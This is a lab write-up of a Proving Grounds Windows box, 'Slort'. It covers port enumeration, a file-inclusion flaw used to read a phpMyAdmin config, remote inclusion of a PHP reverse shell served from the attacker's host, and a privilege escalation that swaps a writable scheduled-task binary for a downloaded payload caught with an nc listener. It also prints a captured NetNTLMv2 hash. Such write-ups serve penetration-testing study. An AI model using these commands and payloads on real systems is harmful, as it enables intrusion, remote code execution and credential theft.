---
machine: Slort
platform: Proving Grounds
category: Windows
difficulty: Medium
tags: [xampp, rfi, php-filter, scheduled-task-hijack]
date: 2026-07-23
status: retired
summary: A dual-instance XAMPP box running a custom PHP site — testing an LFI-that's-actually-an-RFI discovery via `php://filter`, config-file credential disclosure, and a writable scheduled-task binary swap to land Administrator.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/slort]
└─$ nmap-full 192.168.133.53
[*] Running fast port discovery on 192.168.133.53...
[sudo] password for kali: 
[*] Open ports: 21,135,139,445,3306,4443,5040,7680,8080,49664,49665,49666,49667,49668,49669
[*] Running full scan on 192.168.133.53...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 21:42 -0400
Nmap scan report for 192.168.133.53
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.133.53:4443/dashboard/
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.133.53:8080/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-open-proxy: Proxy might be redirecting requests
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: -2s
| smb2-time: 
|   date: 2026-07-24T01:45:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.61 seconds
```

We got a webapp on 4443, a service running on 7680, another webapp on 8080, MySQL database on 3306, and a non anonymous login FTP login on port 21

We feroxbust both directories:
- They both seem to be running the same stack with endpoints /dashboard /site and /dashboard/docs

```bash
┌──(kali㉿kali)-[~/oscp/slort]
└─$ whatweb 192.168.133.53:4443                                                       
http://192.168.133.53:4443 [302 Found] Apache[2.4.43], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], IP[192.168.133.53], OpenSSL[1.1.1g], PHP[7.4.6], RedirectLocation[http://192.168.133.53:4443/dashboard/], X-Powered-By[PHP/7.4.6]
http://192.168.133.53:4443/dashboard/ [200 OK] Apache[2.4.43], Country[RESERVED][ZZ], Email[fastly-logo@2x.png], HTML5, HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], IP[192.168.133.53], JQuery[1.10.2], Modernizr, OpenSSL[1.1.1g], PHP[7.4.6], Script[text/javascript], Title[Welcome to XAMPP]          
┌──(kali㉿kali)-[~/oscp/slort]
└─$ whatweb 192.168.133.53:8080
http://192.168.133.53:8080 [302 Found] Apache[2.4.43], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], IP[192.168.133.53], OpenSSL[1.1.1g], PHP[7.4.6], RedirectLocation[http://192.168.133.53:8080/dashboard/], X-Powered-By[PHP/7.4.6]
http://192.168.133.53:8080/dashboard/ [200 OK] Apache[2.4.43], Country[RESERVED][ZZ], Email[fastly-logo@2x.png], HTML5, HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], IP[192.168.133.53], JQuery[1.10.2], Modernizr, OpenSSL[1.1.1g], PHP[7.4.6], Script[text/javascript], Title[Welcome to XAMPP]  
```

The header is XAMPP Apache + MariaDB + PHP + Perl and Welcome to XAMPP for Windows 7.4.6

I go ahead and search for exploits for the version numbers and tech we have since there doesn't seem to be any interesting credentials or information.

```text
PHP < 8.3.8 - Remote Code Execution (Unauthenticated) (Windows)                                                           | php/webapps/52047.py
```

I'm going to attempt the unauthenticated RCE as I don't see much else.

Unfortunately our version doesn't seem to be vulnerable to that.

We do find this though, which is likely our privesc:
`XAMPP 7.4.3 - Local Privilege Escalation`

Going back through my notes I actually missed that a site was located at /site.

We find the slort website at endpoint:
`http://192.168.133.53:8080/site/index.php?page=main.php`

## Foothold

We find an LFI on `http://192.168.133.53:4443/site/index.php?page=../../../../../../../../../../windows/system.ini`

Given that we have an LFI we want to hunt for the creds in our webapp:

The location we want to view is: `C:\xampp\phpMyAdmin\config.inc.php`

However, when we navigate to it, the site is blank. This suggests the php is executing and that we have an RFI exploit, not an LFI.

We can read it by using `php://filter` to base64 encode it so the characters will be output rather than executed, then we can manually base64 decode it.

`http://192.168.133.53:4443/site/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../..\xampp\phpMyAdmin\config.inc.php`

This gives us the base64 of the config.inc.php
where we see

```text
/* Authentication type and info */
$cfg['Servers'][$i]['auth_type'] = 'config';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = '';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['AllowNoPassword'] = true;
$cfg['Lang'] = '';
```

However, more importantly, because we know its an RFI and not an LFI, we can execute arbitrary php. I serve an Ivan PHP revshell over 445 (try to avoid firewall blocks if any exist) and specify it as an endpoint in `page=` to gain a shell:

```text
http://192.168.133.53:4443/site/index.php?page=http://192.168.45.188:8888/ivan.php
```

```powershell
PS C:\xampp> whoami
slort\rupert
```

## Privilege Escalation

I run winpeas and I find some vectors I may explore for privesc:

```text
FileZillaServer(5648)[c:\xampp\filezillaftp\filezillaserver.exe] -- POwn: rupert
    Permissions: Everyone [Allow: AllAccess], Users [Allow: AllAccess], Authenticated Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking folder: c:\xampp\filezillaftp (Everyone [Allow: AllAccess], Users [Allow: AllAccess], Authenticated Users [Allow: WriteData/CreateFiles])                     
            
    Command Line: c:\xampp\filezillaftp\filezillaserver.exe -compat -start
```

```text
C:\xampp(Everyone [Allow: AllAccess], Users [Allow: AllAccess], Authenticated Users [Allow: WriteData/CreateFiles])
```

```text
# Maybe I can point the .lnk to a controlled binary and have the admin execute it?
Folder: C:\Users\rupert\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: rupert [Allow: AllAccess]
    File: C:\Users\rupert\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XAMPP Control Panel.lnk (Unquoted and Space detected) - C:\Users\rupert\AppData\Roaming\Microsoft\Windows,C:\Users\rupert\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup,C:\Users\rupert\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XAMPP Control Panel.lnk                                                                                               
    FilePerms: rupert [Allow: AllAccess]

```

```text
TCP        127.0.0.1             14147         0.0.0.0               0               Listening         5648            c:\xampp\filezillaftp\filezillaserv
```

Base64 encoded creds? I couldnt seem to extract anything from them:

```text
���������͹ Checking Credential manager (T1555.004)
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              
     Password:              (Unicode Base64 encoded) RUNTMiAAAAAVlUr4r3rFzYqMz3KVY+Mytn5Mjetv7FHSVYSy3lF7rv3/W+yr7QaQCerjI/K4Oq136zaw52/Hnu70oHf6TvvFq6TO8CZz60SvY/Hiy4PssGufjELbpu0RTx10v/3/ADA=
```

```text
����������͹ Enumerating Security Packages Credentials (T1547.005)
  Version: NetNTLMv2
  Hash:    rupert::SLORT:1122334455667788:5fe57aeb777a6031055cc6fab7f0b347:01010000000000001eeb024d1c1bdd01556a063f6e9b03df00000000080030003000000000000000000000000020000087940e6075b9940aa04b874e3d17a22bb2d9f6eb53be24f2ce9852f767add7cb0a00100000000000000000000000000000000000090000000000000000000000
```

We also have Write perms over essentially everything inside `C:\xampp` including FTP, MySQL, etc. We can also enumerate these services for credentials.

If we port forward 3306 we can connect to the mysql database with the creds we found in config.inc.php `root:<no_pass>`

```bash
MariaDB [(none)]> select version();
+-----------------+
| version()       |
+-----------------+
| 10.4.11-MariaDB |
+-----------------+
1 row in set (0.059 sec)
```

Going through all the vectors I previously found, nothing seems to pan out.

We do see a write to C:\Backup\TFTP.exe that looks out of place:

```text
����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow) (T1574.001)
     File Permissions "C:\Backup\TFTP.EXE": Users [Allow: AllAccess],Authenticated Users [Allow: WriteData/CreateFiles]
```

If we navigate to that directory we see a .txt file called info.txt:

```powershell
PS C:\Backup> dir


    Directory: C:\Backup


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/12/2020   7:45 AM          11304 backup.txt                                                           
-a----         6/12/2020   7:45 AM             73 info.txt                                                             
-a----         6/23/2020   7:49 PM          73802 TFTP.EXE                                                             


PS C:\Backup> type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

If we enumerate our scheduled tasks we can't find an instance of a schtask running this meaning it either runs as SYSTEM or doesn't exist.

We have full write over it so we can replace it with a revshell.exe and wait 5 minutes to see if we get a shell as a higher privileged user.

```powershell
PS C:\Backup> Rename-Item -Path TFTP.exe -NewName TFTP.bak

PS C:\Backup> iwr -uri http://192.168.45.222:8888/malware.exe -Outfile ./TFTP.EXE
```

And, after a few minutes, our listener catches a shell as Administrator. We can navigate to the Administrator's desktop and the box is solved!

```bash
──(kali㉿kali)-[192.168.45.222]-[~/oscp/slort]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.222] from (UNKNOWN) [192.168.142.53] 51411
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
slort\administrator
```
